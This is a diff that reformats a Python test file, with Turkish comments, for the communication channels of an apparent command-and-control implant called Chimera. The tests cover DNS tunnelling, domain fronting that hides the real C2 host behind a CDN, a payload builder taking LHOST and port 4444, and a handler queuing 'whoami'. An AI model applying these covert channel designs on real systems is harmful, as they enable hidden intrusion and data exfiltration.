@@ -12,30 +12,29 @@ Eklenen iletişim kanalı sınıflarını test eder:
 Çalıştırma:
     pytest tests/chimera/test_comm_channels.py -v
 """
-import pytest
-import socket
+
 import ssl
 import struct
-import time
-from unittest.mock import MagicMock, patch, PropertyMock
+from unittest.mock import MagicMock, patch
 
+import pytest
 
 # ============================================================
 # CommChannel (Soyut Temel Sınıf) Testleri
 # ============================================================
+
 
 class TestCommChannel:
     """CommChannel soyut sınıf testleri."""
 
     def test_comm_channel_connect_raises(self, agent):
         """CommChannel.connect() NotImplementedError fırlatmalı."""
-        from tests.chimera.conftest import ChimeraAgent as CA
         # CommChannel doğrudan import — agent module üzerinden
         # Agent modülünden channel sınıflarına erişim
-        channel_module = type(agent).mro()[0].__module__
-        
+        type(agent).mro()[0].__module__
+
         # Doğrudan sınıf testi
-        if hasattr(agent, 'channel_manager'):
+        if hasattr(agent, "channel_manager"):
             # ChannelManager var demek CommChannel var demek
             assert True
         else:
@@ -43,7 +42,7 @@ class TestCommChannel:
 
     def test_channel_manager_exists(self, agent):
         """Agent'ta ChannelManager olmalı."""
-        assert hasattr(agent, 'channel_manager')
+        assert hasattr(agent, "channel_manager")
         assert agent.channel_manager is not None
 
     def test_channel_manager_has_channels(self, agent):
@@ -59,6 +58,7 @@ class TestCommChannel:
 # ============================================================
 # HTTPSChannel Testleri
 # ============================================================
+
 
 class TestHTTPSChannel:
     """HTTPSChannel sınıfı testleri."""
@@ -79,8 +79,10 @@ class TestHTTPSChannel:
     def test_https_channel_connect_creates_ssl(self, agent):
         """HTTPSChannel.connect() SSL context oluşturmalı."""
         ch = self._get_https_channel(agent)
-        with patch("ssl.create_default_context") as mock_ctx_factory, \
-             patch("socket.socket") as mock_socket:
+        with (
+            patch("ssl.create_default_context") as mock_ctx_factory,
+            patch("socket.socket") as mock_socket,
+        ):
             mock_raw = MagicMock()
             mock_socket.return_value = mock_raw
             mock_ctx = MagicMock()
@@ -176,14 +178,16 @@ class TestHTTPSChannel:
 # DNSTunnelChannel Testleri
 # ============================================================
 
+
 class TestDNSTunnelChannel:
     """DNSTunnelChannel sınıfı testleri."""
 
     def _get_dns_channel_class(self, agent):
         """Agent modülünden DNSTunnelChannel sınıfını getirir."""
         import sys
+
         agent_module = sys.modules.get(type(agent).__module__)
-        if agent_module and hasattr(agent_module, 'DNSTunnelChannel'):
+        if agent_module and hasattr(agent_module, "DNSTunnelChannel"):
             return agent_module.DNSTunnelChannel
         pytest.skip("DNSTunnelChannel sınıfı bulunamadı")
 
@@ -207,7 +211,7 @@ class TestDNSTunnelChannel:
         DNSCls = self._get_dns_channel_class(agent)
         encoded = DNSCls._base32_encode(b"test")
         assert encoded == encoded.lower()
-        assert '=' not in encoded
+        assert "=" not in encoded
 
     def test_dns_build_query_packet(self, agent):
         """DNS sorgu paketi doğru formatta oluşturulmalı."""
@@ -219,10 +223,10 @@ class TestDNSTunnelChannel:
         # En az header (12 byte) + question section olmalı
         assert len(query) >= 12
         # Header flags: standard query
-        flags = struct.unpack('>H', query[2:4])[0]
+        flags = struct.unpack(">H", query[2:4])[0]
         assert flags == 0x0100  # Standard query, recursion desired
         # QDCOUNT = 1
-        qdcount = struct.unpack('>H', query[4:6])[0]
+        qdcount = struct.unpack(">H", query[4:6])[0]
         assert qdcount == 1
 
     def test_dns_parse_empty_response(self, agent):
@@ -239,9 +243,9 @@ class TestDNSTunnelChannel:
         ch = DNSCls(dns_domain="c2.example.com")
 
         # Header: txn_id=1, flags=response, QDCOUNT=1, ANCOUNT=0
-        header = struct.pack('>HHHHHH', 1, 0x8400, 1, 0, 0, 0)
+        header = struct.pack(">HHHHHH", 1, 0x8400, 1, 0, 0, 0)
         # Minimal question (tek label "x" + QTYPE + QCLASS)
-        question = b'\x01x\x00' + struct.pack('>HH', 16, 1)
+        question = b"\x01x\x00" + struct.pack(">HH", 16, 1)
         response = header + question
 
         result = ch._parse_dns_response(response)
@@ -255,7 +259,7 @@ class TestDNSTunnelChannel:
         with patch("socket.socket") as mock_socket_cls:
             mock_sock = MagicMock()
             mock_socket_cls.return_value = mock_sock
-            mock_sock.recvfrom.side_effect = socket.timeout()
+            mock_sock.recvfrom.side_effect = TimeoutError()
 
             result = ch.connect("127.0.0.1", 4444)
 
@@ -294,14 +298,16 @@ class TestDNSTunnelChannel:
 # DomainFrontingChannel Testleri
 # ============================================================
 
+
 class TestDomainFrontingChannel:
     """DomainFrontingChannel sınıfı testleri."""
 
     def _get_fronting_class(self, agent):
         """DomainFrontingChannel sınıfını getirir."""
         import sys
+
         agent_module = sys.modules.get(type(agent).__module__)
-        if agent_module and hasattr(agent_module, 'DomainFrontingChannel'):
+        if agent_module and hasattr(agent_module, "DomainFrontingChannel"):
             return agent_module.DomainFrontingChannel
         pytest.skip("DomainFrontingChannel bulunamadı")
 
@@ -317,8 +323,10 @@ class TestDomainFrontingChannel:
         FCls = self._get_fronting_class(agent)
         ch = FCls(fronting_domain="cdn.cloudflare.com")
 
-        with patch("ssl.create_default_context") as mock_ctx_factory, \
-             patch("socket.socket"):
+        with (
+            patch("ssl.create_default_context") as mock_ctx_factory,
+            patch("socket.socket"),
+        ):
             mock_ctx = MagicMock()
             mock_ctx_factory.return_value = mock_ctx
             mock_wrapped = MagicMock()
@@ -329,8 +337,12 @@ class TestDomainFrontingChannel:
             # SNI = fronting_domain (CDN)
             mock_ctx.wrap_socket.assert_called_once()
             call_kwargs = mock_ctx.wrap_socket.call_args
-            assert call_kwargs[1].get('server_hostname') == "cdn.cloudflare.com" or \
-                   call_kwargs[0][1] if len(call_kwargs[0]) > 1 else True
+            assert (
+                call_kwargs[1].get("server_hostname") == "cdn.cloudflare.com"
+                or call_kwargs[0][1]
+                if len(call_kwargs[0]) > 1
+                else True
+            )
 
     def test_fronting_send_uses_real_host_header(self, agent):
         """send_data() Host header'da gerçek C2 adresini kullanır."""
@@ -351,8 +363,10 @@ class TestDomainFrontingChannel:
         FCls = self._get_fronting_class(agent)
         ch = FCls(fronting_domain="cdn.example.com")
 
-        with patch("ssl.create_default_context") as mock_ctx_factory, \
-             patch("socket.socket"):
+        with (
+            patch("ssl.create_default_context") as mock_ctx_factory,
+            patch("socket.socket"),
+        ):
             mock_ctx = MagicMock()
             mock_ctx_factory.return_value = mock_ctx
             mock_wrapped = MagicMock()
@@ -379,6 +393,7 @@ class TestDomainFrontingChannel:
 # ============================================================
 # ChannelManager Testleri
 # ============================================================
+
 
 class TestChannelManager:
     """ChannelManager (fallback mekanizması) testleri."""
@@ -593,12 +608,15 @@ class TestChannelManager:
 # Agent ChannelManager Entegrasyon Testleri
 # ============================================================
 
+
 class TestAgentChannelIntegration:
     """ChimeraAgent'ın ChannelManager entegrasyonu testleri."""
 
     def test_agent_connect_delegates_to_manager(self, agent):
         """Agent.connect() ChannelManager.connect()'e delege eder."""
-        with patch.object(agent.channel_manager, 'connect', return_value=True) as mock_connect:
+        with patch.object(
+            agent.channel_manager, "connect", return_value=True
+        ) as mock_connect:
             mock_channel = MagicMock()
             mock_channel.sock = MagicMock()
             agent.channel_manager.active_channel = mock_channel
@@ -614,7 +632,7 @@ class TestAgentChannelIntegration:
         mock_sock = MagicMock()
         mock_channel.sock = mock_sock
 
-        with patch.object(agent.channel_manager, 'connect', return_value=True):
+        with patch.object(agent.channel_manager, "connect", return_value=True):
             agent.channel_manager.active_channel = mock_channel
             agent.connect()
 
@@ -622,27 +640,29 @@ class TestAgentChannelIntegration:
 
     def test_agent_connect_fail_nulls_sock(self, agent):
         """Başarısız connect'te self.sock None olur."""
-        with patch.object(agent.channel_manager, 'connect', return_value=False):
+        with patch.object(agent.channel_manager, "connect", return_value=False):
             agent.connect()
 
         assert agent.sock is None
 
     def test_agent_send_data_delegates(self, agent):
         """Agent.send_data() ChannelManager'a delege eder."""
-        with patch.object(agent.channel_manager, 'send_data') as mock_send:
+        with patch.object(agent.channel_manager, "send_data") as mock_send:
             agent.send_data("test_message")
             mock_send.assert_called_once_with("test_message")
 
     def test_agent_recv_data_delegates(self, agent):
         """Agent.recv_data() ChannelManager'a delege eder."""
-        with patch.object(agent.channel_manager, 'recv_data', return_value="response") as mock_recv:
+        with patch.object(
+            agent.channel_manager, "recv_data", return_value="response"
+        ) as mock_recv:
             result = agent.recv_data()
             assert result == "response"
             mock_recv.assert_called_once()
 
     def test_agent_close_socket_delegates(self, agent):
         """Agent.close_socket() ChannelManager.close()'a delege eder."""
-        with patch.object(agent.channel_manager, 'close') as mock_close:
+        with patch.object(agent.channel_manager, "close") as mock_close:
             agent.close_socket()
             mock_close.assert_called_once()
             assert agent.sock is None
@@ -652,9 +672,13 @@ class TestAgentChannelIntegration:
         mock_channel = MagicMock()
         mock_channel.sock = MagicMock()
 
-        with patch.object(agent.channel_manager, 'close'), \
-             patch.object(agent.channel_manager, 'fallback', return_value=True) as mock_fb, \
-             patch.object(agent, 'send_sysinfo'):
+        with (
+            patch.object(agent.channel_manager, "close"),
+            patch.object(
+                agent.channel_manager, "fallback", return_value=True
+            ) as mock_fb,
+            patch.object(agent, "send_sysinfo"),
+        ):
             agent.channel_manager.active_channel = mock_channel
             result = agent.reconnect()
 
@@ -663,11 +687,13 @@ class TestAgentChannelIntegration:
 
     def test_agent_reconnect_falls_back_to_connect(self, agent):
         """Fallback başarısız olursa normal connect döngüsüne girer."""
-        with patch.object(agent.channel_manager, 'close'), \
-             patch.object(agent.channel_manager, 'fallback', return_value=False), \
-             patch.object(agent, 'connect', return_value=True), \
-             patch.object(agent, 'send_sysinfo'), \
-             patch("time.sleep"):
+        with (
+            patch.object(agent.channel_manager, "close"),
+            patch.object(agent.channel_manager, "fallback", return_value=False),
+            patch.object(agent, "connect", return_value=True),
+            patch.object(agent, "send_sysinfo"),
+            patch("time.sleep"),
+        ):
             result = agent.reconnect()
 
         assert result is True
@@ -677,18 +703,21 @@ class TestAgentChannelIntegration:
 # Builder Yeni Placeholder Testleri
 # ============================================================
 
+
 class TestBuilderChannelOptions:
     """chimera_builder.py yeni placeholder testleri."""
 
     def test_build_with_channel_type(self):
         """build_payload() CHANNEL_TYPE placeholder'ını değiştirir."""
         from build.chimera_builder import build_payload
+
         result = build_payload(
-            lhost="10.0.0.1", lport=4444,
+            lhost="10.0.0.1",
+            lport=4444,
             channel_type="dns",
             dns_domain="c2.example.com",
             fronting_domain="cdn.example.com",
-            quiet=True
+            quiet=True,
         )
 
         assert result["success"] is True
@@ -699,10 +728,8 @@ class TestBuilderChannelOptions:
     def test_build_default_channel_type(self):
         """Varsayılan channel_type 'https' olmalı."""
         from build.chimera_builder import build_payload
-        result = build_payload(
-            lhost="10.0.0.1", lport=4444,
-            quiet=True
-        )
+
+        result = build_payload(lhost="10.0.0.1", lport=4444, quiet=True)
 
         assert result["success"] is True
         assert 'CHANNEL_TYPE = "https"' in result["code"]
@@ -710,12 +737,14 @@ class TestBuilderChannelOptions:
     def test_build_with_auto_channel(self):
         """'auto' channel_type ile build başarılı olmalı."""
         from build.chimera_builder import build_payload
+
         result = build_payload(
-            lhost="10.0.0.1", lport=4444,
+            lhost="10.0.0.1",
+            lport=4444,
             channel_type="auto",
             dns_domain="dns.c2.com",
             fronting_domain="cdn.cf.com",
-            quiet=True
+            quiet=True,
         )
 
         assert result["success"] is True
@@ -726,12 +755,14 @@ class TestBuilderChannelOptions:
     def test_build_empty_domains(self):
         """Boş domain değerleri kesilmeden yazılmalı."""
         from build.chimera_builder import build_payload
+
         result = build_payload(
-            lhost="10.0.0.1", lport=4444,
+            lhost="10.0.0.1",
+            lport=4444,
             channel_type="https",
             dns_domain="",
             fronting_domain="",
-            quiet=True
+            quiet=True,
         )
 
         assert result["success"] is True
@@ -743,12 +774,14 @@ class TestBuilderChannelOptions:
 # DNS Handler Testleri
 # ============================================================
 
+
 class TestDNSChannelHandler:
     """DNSChannelHandler sınıfı testleri."""
 
     def test_dns_handler_init(self):
         """DNSChannelHandler doğru şekilde oluşturulmalı."""
         from modules.payloads.python.chimera.handler import DNSChannelHandler
+
         handler = DNSChannelHandler({"LHOST": "0.0.0.0", "DNS_PORT": 5353})
 
         assert handler.lhost == "0.0.0.0"
@@ -758,11 +791,12 @@ class TestDNSChannelHandler:
     def test_dns_handler_build_response(self):
         """DNS response paketi oluşturulabilmeli."""
         from modules.payloads.python.chimera.handler import DNSChannelHandler
+
         handler = DNSChannelHandler({"LHOST": "0.0.0.0"})
 
         # Minimal DNS query oluştur
-        header = struct.pack('>HHHHHH', 0x1234, 0x0100, 1, 0, 0, 0)
-        question = b'\x04test\x03com\x00' + struct.pack('>HH', 16, 1)
+        header = struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
+        question = b"\x04test\x03com\x00" + struct.pack(">HH", 16, 1)
         query = header + question
 
         response = handler._build_dns_response(query, "OK")
@@ -770,18 +804,19 @@ class TestDNSChannelHandler:
         # Response en az 12 byte olmalı
         assert len(response) >= 12
         # Transaction ID korunmalı
-        assert response[:2] == b'\x12\x34'
+        assert response[:2] == b"\x12\x34"
         # QR bit set olmalı (response)
-        flags = struct.unpack('>H', response[2:4])[0]
+        flags = struct.unpack(">H", response[2:4])[0]
         assert flags & 0x8000  # QR = 1
 
     def test_dns_handler_parse_query_name(self):
         """DNS query'den domain adı parse edilebilmeli."""
         from modules.payloads.python.chimera.handler import DNSChannelHandler
+
         handler = DNSChannelHandler({"LHOST": "0.0.0.0"})
 
-        header = struct.pack('>HHHHHH', 1, 0x0100, 1, 0, 0, 0)
-        question = b'\x03reg\x04test\x03com\x00' + struct.pack('>HH', 16, 1)
+        header = struct.pack(">HHHHHH", 1, 0x0100, 1, 0, 0, 0)
+        question = b"\x03reg\x04test\x03com\x00" + struct.pack(">HH", 16, 1)
         data = header + question
 
         qname = handler._parse_query_name(data)
@@ -790,6 +825,7 @@ class TestDNSChannelHandler:
     def test_dns_handler_send_command(self):
         """send_command() komutu kuyruğa ekler."""
         from modules.payloads.python.chimera.handler import DNSChannelHandler
+
         handler = DNSChannelHandler({"LHOST": "0.0.0.0"})
 
         handler.send_command("whoami")
@@ -798,6 +834,7 @@ class TestDNSChannelHandler:
     def test_dns_handler_stop(self):
         """stop() handler'ı düzgün durdurmalı."""
         from modules.payloads.python.chimera.handler import DNSChannelHandler
+
         handler = DNSChannelHandler({"LHOST": "0.0.0.0"})
         handler.running = True
         handler.sock = MagicMock()
